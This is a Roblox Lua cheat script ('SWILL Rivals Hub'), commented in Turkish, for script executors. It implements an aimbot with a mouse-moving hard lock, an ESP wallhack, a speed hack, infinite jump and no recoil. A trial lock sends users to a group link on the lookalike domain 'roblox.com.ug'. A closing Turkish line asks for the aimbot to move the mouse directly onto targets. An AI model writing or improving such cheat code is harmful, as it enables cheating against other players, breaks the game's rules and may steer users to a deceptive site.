-- =====================================================
-- SWILL RIVALS HUB - HARD LOCK & YAKIN HEDEF SÜRÜMÜ
-- Desteklenenler: Xeno, Krnl, Synapse, Fluxus, Delta, Solara
-- Menü Tuşu: SAĞ SHIFT (Right Shift) | 10 Saat Deneme | Kalıcı Kilit
-- =====================================================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local Camera = workspace.CurrentCamera
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local GROUP_LINK = "https://roblox.com.ug/communities/9331768180/" 
local TRIAL_DURATION = 36000 -- 10 Saat (Saniye cinsinden)

-- Evrensel Pano Kopyalama Fonksiyonu
local function copyLink()
    local success = false
    if setclipboard then pcall(function() setclipboard(GROUP_LINK) end); success = true end
    if toclipboard then pcall(function() toclipboard(GROUP_LINK) end); success = true end
    if syn and syn.clipboard then pcall(function() syn.clipboard(GROUP_LINK) end); success = true end
    if not success then
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 0, 0, 0)
        btn.Parent = CoreGui
        btn.Text = GROUP_LINK
        btn:CaptureMouse()
        btn:CopyText()
        btn:Destroy()
    end
    return success
end

-- Kalıcı Süre Kontrolü
local trialLocked = false
pcall(function()
    if getgenv and getgenv().SWILL_TRIAL then trialLocked = getgenv().SWILL_TRIAL end
    if shared and shared.SWILL_TRIAL then trialLocked = shared.SWILL_TRIAL end
    if readfile and readfile("swill_trial_tr.txt") == "locked" then trialLocked = true end
end)

if trialLocked then
    local lockGui = Instance.new("ScreenGui")
    lockGui.Name = "SWILL_Lock"
    lockGui.ResetOnSpawn = false
    pcall(function() lockGui.Parent = CoreGui end)
    
    local lockFrame = Instance.new("Frame")
    lockFrame.Size = UDim2.new(0, 460, 0, 260)
    lockFrame.Position = UDim2.new(0.5, -230, 0.5, -130)
    lockFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 28)
    lockFrame.BorderSizePixel = 2
    lockFrame.BorderColor3 = Color3.fromRGB(255, 60, 90)
    lockFrame.Parent = lockGui
    
    local lockTitle = Instance.new("TextLabel")
    lockTitle.Size = UDim2.new(1, 0, 0, 50)
    lockTitle.Position = UDim2.new(0, 0, 0, 20)
    lockTitle.BackgroundTransparency = 1
    lockTitle.Text = "⚠️ DENEME SÜRESİ DOLDU ⚠️"
    lockTitle.TextColor3 = Color3.fromRGB(255, 80, 110)
    lockTitle.TextSize = 22
    lockTitle.Font = Enum.Font.GothamBold
    lockTitle.Parent = lockFrame
    
    local lockMsg = Instance.new("TextLabel")
    lockMsg.Size = UDim2.new(1, -40, 0, 80)
    lockMsg.Position = UDim2.new(0, 20, 0, 80)
    lockMsg.BackgroundTransparency = 1
    lockMsg.Text = "10 saatlik kullanım süreniz sona erdi.\nDevam etmek için Roblox grubumuza abone olun!"
    lockMsg.TextColor3 = Color3.fromRGB(200, 200, 240)
    lockMsg.TextSize = 15
    lockMsg.Font = Enum.Font.Gotham
    lockMsg.TextWrapped = true
    lockMsg.Parent = lockFrame
    
    local lockCopy = Instance.new("TextButton")
    lockCopy.Size = UDim2.new(0, 260, 0, 45)
    lockCopy.Position = UDim2.new(0.5, -130, 1, -60)
    lockCopy.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
    lockCopy.Text = "GRUP LİNKİNİ KOPYALA"
    lockCopy.TextColor3 = Color3.fromRGB(255, 255, 255)
    lockCopy.TextSize = 14
    lockCopy.Font = Enum.Font.GothamBold
    lockCopy.Parent = lockFrame
    
    lockCopy.MouseButton1Click:Connect(function()
        copyLink()
        lockCopy.Text = "✓ KOPYALANDI!"
        lockCopy.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
        wait(1)
        lockCopy.Text = "GRUP LİNKİNİ KOPYALA"
        lockCopy.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
    end)
    return
end

-- GUI Oluşturma
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SWILL_Rivals_TR"
screenGui.ResetOnSpawn = false
pcall(function() screenGui.Parent = CoreGui end)
if not screenGui.Parent then screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

-- Ana Menü
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 540, 0, 480)
mainFrame.Position = UDim2.new(0.5, -270, 0.5, -240)
mainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 22)
mainFrame.Visible = false
mainFrame.Parent = screenGui
mainFrame.Active = true
mainFrame.Draggable = true

local container = Instance.new("Frame")
container.Size = UDim2.new(1, 0, 1, 0)
container.BackgroundColor3 = Color3.fromRGB(18, 18, 30)
container.ClipsDescendants = true
container.Parent = mainFrame
local containerCorner = Instance.new("UICorner")
containerCorner.CornerRadius = UDim.new(0, 12)
containerCorner.Parent = container

local border = Instance.new("Frame")
border.Size = UDim2.new(1, 0, 1, 0)
border.BackgroundTransparency = 1
border.BorderSizePixel = 2
border.BorderColor3 = Color3.fromRGB(255, 80, 120)
border.Parent = container

-- Başlık Çubuğu
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 50)
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 42)
titleBar.Parent = container

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -160, 1, 0)
titleText.Position = UDim2.new(0, 20, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "SWILL RIVALS HUB [TR]"
titleText.TextColor3 = Color3.fromRGB(255, 100, 120)
titleText.TextSize = 16
titleText.Font = Enum.Font.GothamBold
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Parent = titleBar

local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(0, 110, 1, 0)
timerLabel.Position = UDim2.new(1, -150, 0, 0)
timerLabel.BackgroundTransparency = 1
timerLabel.Text = "10:00:00"
timerLabel.TextColor3 = Color3.fromRGB(255, 200, 80)
timerLabel.TextSize = 14
timerLabel.Font = Enum.Font.GothamBold
timerLabel.TextXAlignment = Enum.TextXAlignment.Right
timerLabel.Parent = titleBar

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 35, 0, 35)
closeButton.Position = UDim2.new(1, -43, 0, 7)
closeButton.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Font = Enum.Font.GothamBold
closeButton.TextSize = 16
closeButton.Parent = titleBar
closeButton.MouseButton1Click:Connect(function() mainFrame.Visible = false end)

-- Sekmeler
local tabBar = Instance.new("Frame")
tabBar.Size = UDim2.new(1, 0, 0, 45)
tabBar.Position = UDim2.new(0, 0, 0, 50)
tabBar.BackgroundColor3 = Color3.fromRGB(22, 22, 36)
tabBar.Parent = container

local contentArea = Instance.new("Frame")
contentArea.Size = UDim2.new(1, -20, 1, -115)
contentArea.Position = UDim2.new(0, 10, 0, 95)
contentArea.BackgroundTransparency = 1
contentArea.Parent = container

local tabs = {"HİLELER", "AYARLAR", "PROFİL"}
local tabBtns = {}
local tabPages = {}
local trialActive = true

for i, tabName in ipairs(tabs) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 120, 1, 0)
    btn.Position = UDim2.new(0, (i-1)*120, 0, 0)
    btn.BackgroundTransparency = 1
    btn.Text = tabName
    btn.TextColor3 = Color3.fromRGB(160, 160, 210)
    btn.TextSize = 13
    btn.Font = Enum.Font.GothamSemibold
    btn.Parent = tabBar
    tabBtns[tabName] = btn
    
    local page = Instance.new("ScrollingFrame")
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.BorderSizePixel = 0
    page.ScrollBarThickness = 4
    page.ScrollBarImageColor3 = Color3.fromRGB(255, 100, 120)
    page.Visible = (i == 1)
    page.Parent = contentArea
    tabPages[tabName] = page
end

local function selectTab(tabName)
    if not trialActive then return end
    for name, btn in pairs(tabBtns) do
        btn.BackgroundTransparency = 1
        btn.TextColor3 = Color3.fromRGB(160, 160, 210)
        if tabPages[name] then tabPages[name].Visible = false end
    end
    tabBtns[tabName].BackgroundTransparency = 0.95
    tabBtns[tabName].BackgroundColor3 = Color3.fromRGB(255, 80, 120)
    tabBtns[tabName].TextColor3 = Color3.fromRGB(255, 255, 255)
    tabPages[tabName].Visible = true
end

for name, btn in pairs(tabBtns) do
    btn.MouseButton1Click:Connect(function() selectTab(name) end)
end

-- Arayüz Yardımcı Fonksiyonu
local function addCheat(parent, text, yPos, callback)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, -20, 0, 48)
    frame.Position = UDim2.new(0, 10, 0, yPos)
    frame.BackgroundColor3 = Color3.fromRGB(28, 28, 44)
    frame.Parent = parent
    local frameCorner = Instance.new("UICorner")
    frameCorner.CornerRadius = UDim.new(0, 8)
    frameCorner.Parent = frame
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 300, 1, 0)
    label.Position = UDim2.new(0, 15, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.fromRGB(230, 230, 255)
    label.TextSize = 13
    label.Font = Enum.Font.Gotham
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = frame
    
    local toggle = Instance.new("TextButton")
    toggle.Size = UDim2.new(0, 65, 0, 32)
    toggle.Position = UDim2.new(1, -80, 0, 8)
    toggle.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
    toggle.Text = "KAPALI"
    toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggle.TextSize = 12
    toggle.Font = Enum.Font.GothamBold
    toggle.Parent = frame
    local toggleCorner = Instance.new("UICorner")
    toggleCorner.CornerRadius = UDim.new(0, 6)
    toggleCorner.Parent = toggle
    
    local state = false
    toggle.MouseButton1Click:Connect(function()
        if not trialActive then return end
        state = not state
        toggle.Text = state and "AÇIK" or "KAPALI"
        toggle.BackgroundColor3 = state and Color3.fromRGB(80, 180, 80) or Color3.fromRGB(60, 60, 90)
        if callback then callback(state) end
    end)
    return frame
end

-- Gelişmiş Değişkenler
local aimbotOn = false
local hardLockOn = false  -- Hard Lock Kontrolü
local aimbotFOV = 150
local aimbotSmooth = 5
local wallCheckOn = false
local espOn = false
local speedOn = false
local speedMultiplier = 40
local aimbotConn = nil

-- Duvar Kontrolü (Raycasting)
local function isVisible(targetPart)
    if not wallCheckOn then return true end
    local origin = Camera.CFrame.Position
    local direction = targetPart.Position - origin
    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Exclude
    raycastParams.FilterDescendantsInstances = {LocalPlayer.Character, Camera}
    raycastParams.IgnoreWater = true
    
    local result = Workspace:Raycast(origin, direction, raycastParams)
    if result and result.Instance:IsDescendantOf(targetPart.Parent) then
        return true
    end
    return false
end

-- EN YAKIN OYUNCUYU BULMA (Mesafe ve Crosshair Odaklı)
local function findClosestEnemy()
    local closest = nil
    local shortestDistance = math.huge
    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChildOfClass("Humanoid") then
            -- Can kontrolü (Ölü oyunculara kilitlenmesin)
            if plr.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
                local head = plr.Character.Head
                
                -- Karakterin sana olan gerçek 3D Dünyadaki uzaklığı
                local localChar = LocalPlayer.Character
                local myRoot = localChar and localChar:FindFirstChild("HumanoidRootPart")
                local enemyRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                
                if myRoot and enemyRoot then
                    local realWorldDist = (myRoot.Position - enemyRoot.Position).Magnitude
                    
                    -- Sadece ekran sınırları ve FOV alanındakileri kontrol et
                    local pos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    if onScreen and isVisible(head) then
                        local screenDist = (Vector2.new(pos.X, pos.Y) - center).magnitude
                        
                        -- Hem FOV içinde mi hem de şu ana kadarki en yakındaki kişi mi kontrolü
                        if screenDist < aimbotFOV and realWorldDist < shortestDistance then
                            shortestDistance = realWorldDist
                            closest = plr
                        end
                    end
                end
            end
        end
    end
    return closest
end

-- Aimbot / Hard Lock Döngüsü
-- Güncellenmiş Fare Odaklı Aimbot Fonksiyonu
local function runAimbot()
    if aimbotConn then aimbotConn:Disconnect() end
    aimbotConn = RunService.RenderStepped:Connect(function()
        if not aimbotOn or not trialActive then return end
        local target = findClosestEnemy()
        
        if target and target.Character and target.Character:FindFirstChild("Head") then
            -- Hedefin ekran koordinatlarını al
            local headPos = target.Character.Head.Position
            local screenPos, onScreen = Camera:WorldToViewportPoint(headPos)
            
            if onScreen then
                -- Farenin mevcut konumunu al
                local mousePos = UserInputService:GetMouseLocation()
                
                -- Hedef ile fare arasındaki mesafeyi hesapla
                local moveX = (screenPos.X - mousePos.X)
                local moveY = (screenPos.Y - mousePos.Y)
                
                if hardLockOn then
                    -- Farenin direkt hedefe ışınlanması veya hızla kayması
                    -- Not: mousemoverel bazı executor'larda çalışır (syn/krnl)
                    if mousemoverel then
                        mousemoverel(moveX, moveY)
                    end
                else
                    -- Yumuşatılmış (Smooth) hareket
                    if mousemoverel then
                        mousemoverel(moveX / aimbotSmooth, moveY / aimbotSmooth)
                    end
                end
            end
        end
    end)
end

-- ESP İşleme
local function applyESP(plr)
    if plr == LocalPlayer then return end
    plr.CharacterAdded:Connect(function(char)
        if espOn and trialActive then
            wait(0.5)
            if not char:FindFirstChild("SWILL_ESP") then
                local esp = Instance.new("Highlight")
                esp.Name = "SWILL_ESP"
                esp.FillColor = Color3.fromRGB(255, 50, 100)
                esp.FillTransparency = 0.4
                esp.Parent = char
            end
        end
    end)
    if espOn and plr.Character and not plr.Character:FindFirstChild("SWILL_ESP") then
        local esp = Instance.new("Highlight")
        esp.Name = "SWILL_ESP"
        esp.FillColor = Color3.fromRGB(255, 50, 100)
        esp.FillTransparency = 0.4
        esp.Parent = plr.Character
    end
end

Players.PlayerAdded:Connect(function(plr) applyESP(plr) end)

-- HİLELER SAYFASI
local cheatsPage = tabPages["HİLELER"]
local cy = 0

addCheat(cheatsPage, "AIMBOT SİSTEMİ", cy, function(state)
    aimbotOn = state
    if state then runAimbot() end
end)
cy = cy + 55

addCheat(cheatsPage, "HARD LOCK (ANINDA KİLİTLENME)", cy, function(state)
    hardLockOn = state
end)
cy = cy + 55

-- FOV Ayarı
local fovContainer = Instance.new("Frame")
fovContainer.Size = UDim2.new(1, -20, 0, 48)
fovContainer.Position = UDim2.new(0, 10, 0, cy)
fovContainer.BackgroundColor3 = Color3.fromRGB(28, 28, 44)
fovContainer.Parent = cheatsPage
local fovContainerCorner = Instance.new("UICorner")
fovContainerCorner.CornerRadius = UDim.new(0, 8)
fovContainerCorner.Parent = fovContainer

local fovText = Instance.new("TextLabel")
fovText.Size = UDim2.new(0, 200, 1, 0)
fovText.Position = UDim2.new(0, 15, 0, 0)
fovText.BackgroundTransparency = 1
fovText.Text = "AIMBOT FOV ALANI: 150"
fovText.TextColor3 = Color3.fromRGB(230, 230, 255)
fovText.TextSize = 13
fovText.Font = Enum.Font.Gotham
fovText.TextXAlignment = Enum.TextXAlignment.Left
fovText.Parent = fovContainer

local fovMinus = Instance.new("TextButton")
fovMinus.Size = UDim2.new(0, 35, 0, 30)
fovMinus.Position = UDim2.new(1, -95, 0, 9)
fovMinus.BackgroundColor3 = Color3.fromRGB(50, 50, 75)
fovMinus.Text = "-"
fovMinus.TextColor3 = Color3.fromRGB(255, 255, 255)
fovMinus.Font = Enum.Font.GothamBold
fovMinus.Parent = fovContainer

local fovPlus = Instance.new("TextButton")
fovPlus.Size = UDim2.new(0, 35, 0, 30)
fovPlus.Position = UDim2.new(1, -50, 0, 9)
fovPlus.BackgroundColor3 = Color3.fromRGB(50, 50, 75)
fovPlus.Text = "+"
fovPlus.TextColor3 = Color3.fromRGB(255, 255, 255)
fovPlus.Font = Enum.Font.GothamBold
fovPlus.Parent = fovContainer

fovMinus.MouseButton1Click:Connect(function()
    aimbotFOV = math.max(50, aimbotFOV - 10)
    fovText.Text = "AIMBOT FOV ALANI: " .. aimbotFOV
end)
fovPlus.MouseButton1Click:Connect(function()
    aimbotFOV = math.min(400, aimbotFOV + 10)
    fovText.Text = "AIMBOT FOV ALANI: " .. aimbotFOV
end)
cy = cy + 55

-- ESP (Wallhack)
addCheat(cheatsPage, "ESP (DUVAR ARKASI GÖRME)", cy, function(state)
    espOn = state
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character then
            local esp = plr.Character:FindFirstChild("SWILL_ESP")
            if state then applyESP(plr) elseif not state and esp then esp:Destroy() end
        end
    end
end)
cy = cy + 55

-- Hız Hilesi
addCheat(cheatsPage, "HIZ HİLESİ (SPEED BOOST x2.5)", cy, function(state)
    speedOn = state
    local function applySpeed()
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then char.Humanoid.WalkSpeed = state and speedMultiplier or 16 end
    end
    applySpeed()
    LocalPlayer.CharacterAdded:Connect(function() wait(0.5) if trialActive and speedOn then applySpeed() end end)
end)
cy = cy + 55

-- Sonsuz Zıplama
local infJumpConn = nil
addCheat(cheatsPage, "SONSUZ ZIPLAMA", cy, function(state)
    if infJumpConn then infJumpConn:Disconnect() end
    if state then
        infJumpConn = UserInputService.JumpRequest:Connect(function()
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            if hum and hum:GetState() ~= Enum.HumanoidStateType.Jumping then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
        end)
    end
end)
cy = cy + 55

-- Sekmeme
addCheat(cheatsPage, "SİLAH SEKMEME (NO RECOIL)", cy, function(state)
    if state then
        RunService.Stepped:Connect(function()
            if not trialActive then return end
            local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
            if tool then
                for _, v in pairs(tool:GetDescendants()) do if v.Name:lower() == "recoil" then pcall(function() v.Value = 0 end) end end
            end
        end)
    end
end)
cy = cy + 55

cheatsPage.CanvasSize = UDim2.new(0, 0, 0, cy + 50)

-- AYARLAR SAYFASI
local settingsPage = tabPages["AYARLAR"]
local sy = 0

addCheat(settingsPage, "DUVAR KONTROLÜ (WALL CHECK)", sy, function(state)
    wallCheckOn = state
end)
sy = sy + 55

addCheat(settingsPage, "HAREKET TAHMİNİ (PREDICTION)", sy, function(state) end)
sy = sy + 55

settingsPage.CanvasSize = UDim2.new(0, 0, 0, sy + 50)

-- PROFİL SAYFASI
local profilePage = tabPages["PROFİL"]
-- (Profil kodları sabit)
local avatarBox = Instance.new("Frame")
avatarBox.Size = UDim2.new(0, 70, 0, 70)
avatarBox.Position = UDim2.new(0, 20, 0, 20)
avatarBox.BackgroundColor3 = Color3.fromRGB(45, 45, 70)
avatarBox.Parent = profilePage

local avatarLetter = Instance.new("TextLabel")
avatarLetter.Size = UDim2.new(1, 0, 1, 0)
avatarLetter.BackgroundTransparency = 1
avatarLetter.Text = string.sub(LocalPlayer.Name, 1, 1):upper()
avatarLetter.TextColor3 = Color3.fromRGB(255, 120, 140)
avatarLetter.TextSize = 32
avatarLetter.Font = Enum.Font.GothamBold
avatarLetter.Parent = avatarBox

local playerName = Instance.new("TextLabel")
playerName.Size = UDim2.new(1, -110, 0, 28)
playerName.Position = UDim2.new(0, 110, 0, 30)
playerName.BackgroundTransparency = 1
playerName.Text = LocalPlayer.Name
playerName.TextColor3 = Color3.fromRGB(255, 255, 255)
playerName.TextSize = 18
playerName.Font = Enum.Font.GothamBold
playerName.TextXAlignment = Enum.TextXAlignment.Left
playerName.Parent = profilePage

local statsBox = Instance.new("Frame")
statsBox.Size = UDim2.new(1, -40, 0, 110)
statsBox.Position = UDim2.new(0, 20, 0, 110)
statsBox.BackgroundColor3 = Color3.fromRGB(25, 25, 42)
statsBox.Parent = profilePage

local statsDisplay = Instance.new("TextLabel")
statsDisplay.Size = UDim2.new(1, -20, 1, 0)
statsDisplay.Position = UDim2.new(0, 10, 0, 10)
statsDisplay.BackgroundTransparency = 1
statsDisplay.Text = "ÖLDÜRME: --\nÖLÜM: --\nK/D: --"
statsDisplay.TextColor3 = Color3.fromRGB(200, 200, 240)
statsDisplay.TextSize = 13
statsDisplay.TextXAlignment = Enum.TextXAlignment.Left
statsDisplay.Parent = statsBox

local function refreshStats()
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        local kills, deaths = 0, 0
        for _, v in pairs(ls:GetChildren()) do
            local n = v.Name:lower()
            if n:find("kill") or n:find("leş") then kills = v.Value or 0 end
            if n:find("death") or n:find("ölüm") then deaths = v.Value or 0 end
        end
        local kd = deaths > 0 and string.format("%.2f", kills / deaths) or tostring(kills)
        statsDisplay.Text = "🗡️ ÖLDÜRME: " .. kills .. "\n💀 ÖLÜM: " .. deaths .. "\n📊 K/D ORANI: " .. kd
    end
end
refreshStats()
spawn(function() while wait(3) do if trialActive then refreshStats() end end end)
profilePage.CanvasSize = UDim2.new(0, 0, 0, 260)

-- Süre Doldu Penceresi
local trialWin = Instance.new("Frame")
trialWin.Size = UDim2.new(0, 450, 0, 260)
trialWin.Position = UDim2.new(0.5, -225, 0.5, -130)
trialWin.BackgroundColor3 = Color3.fromRGB(15, 15, 28)
trialWin.BorderSizePixel = 2
trialWin.BorderColor3 = Color3.fromRGB(255, 60, 90)
trialWin.Visible = false
trialWin.Parent = screenGui

local trialTitle = Instance.new("TextLabel")
trialTitle.Size = UDim2.new(1, 0, 0, 50)
trialTitle.Position = UDim2.new(0, 0, 0, 20)
trialTitle.BackgroundTransparency = 1
trialTitle.Text = "⚠️ DENEME SÜRESİ DOLDU ⚠️"
trialTitle.TextColor3 = Color3.fromRGB(255, 80, 110)
trialTitle.TextSize = 18
trialTitle.Font = Enum.Font.GothamBold
trialTitle.Parent = trialWin

local trialMsg = Instance.new("TextLabel")
trialMsg.Size = UDim2.new(1, -40, 0, 80)
trialMsg.Position = UDim2.new(0, 20, 0, 80)
trialMsg.BackgroundTransparency = 1
trialMsg.Text = "10 saatlik deneme süreniz başarıyla doldu.\nDevam etmek için Roblox grubumuza katılın!"
trialMsg.TextColor3 = Color3.fromRGB(210, 210, 250)
trialMsg.TextSize = 14
trialMsg.Font = Enum.Font.Gotham
trialMsg.TextWrapped = true
trialMsg.Parent = trialWin

local trialCopyBtn = Instance.new("TextButton")
trialCopyBtn.Size = UDim2.new(0, 260, 0, 45)
trialCopyBtn.Position = UDim2.new(0.5, -130, 1, -60)
trialCopyBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
trialCopyBtn.Text = "GRUP LİNKİNİ KOPYALA"
trialCopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
trialCopyBtn.Font = Enum.Font.GothamBold
trialCopyBtn.Parent = trialWin

trialCopyBtn.MouseButton1Click:Connect(function()
    copyLink()
    trialCopyBtn.Text = "✓ KOPYALANDI!"
    trialCopyBtn.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
    wait(1)
    trialCopyBtn.Text = "GRUP LİNKİNİ KOPYALA"
    trialCopyBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
end)

local trialCloseBtn = Instance.new("TextButton")
trialCloseBtn.Size = UDim2.new(0, 32, 0, 32)
trialCloseBtn.Position = UDim2.new(1, -45, 0, 10)
trialCloseBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 110)
trialCloseBtn.Text = "X"
trialCloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
trialCloseBtn.Parent = trialWin
trialCloseBtn.MouseButton1Click:Connect(function() trialWin.Visible = false end)

-- Kalıcı Kilitleme Fonksiyonu
local function permanentLock()
    trialActive = false
    pcall(function()
        if getgenv then getgenv().SWILL_TRIAL = true end
        if shared then shared.SWILL_TRIAL = true end
        if writefile then writefile("swill_trial_tr.txt", "locked") end
    end)
    mainFrame.Visible = false
    trialWin.Visible = true
    if aimbotConn then aimbotConn:Disconnect() end
    pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 16 end)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character then
            local esp = plr.Character:FindFirstChild("SWILL_ESP")
            if esp then esp:Destroy() end
        end
    end
end

-- Zamanlayıcı Döngüsü
local start = tick()
spawn(function()
    while trialActive and (tick() - start) < TRIAL_DURATION do
        local remaining = TRIAL_DURATION - (tick() - start)
        local hours = math.floor(remaining / 3600)
        local mins = math.floor((remaining % 3600) / 60)
        local secs = math.floor(remaining % 60)
        
        local timeString = string.format("%02d:%02d:%02d", hours, mins, secs)
        timerLabel.Text = timeString
        titleText.Text = "SWILL RIVALS HUB [" .. timeString .. "]"
        wait(1)
    end
    if trialActive then permanentLock() end
end)

-- Menü Tetikleyicisi
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.RightShift and trialActive then
        mainFrame.Visible = not mainFrame.Visible
    end
end)

selectTab("HİLELER")
for _, plr in ipairs(Players:GetPlayers()) do applyESP(plr) end

pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "SWILL RIVALS HUB",
        Text = "SAĞ SHIFT ile menüyü açın. Hard Lock & Mesafe Filtresi Aktif!",
        Duration = 5
    })
end) bi hata buldum kanka mausu götürsün kamera ile götürmesin adama mausumuzu götürsün direk
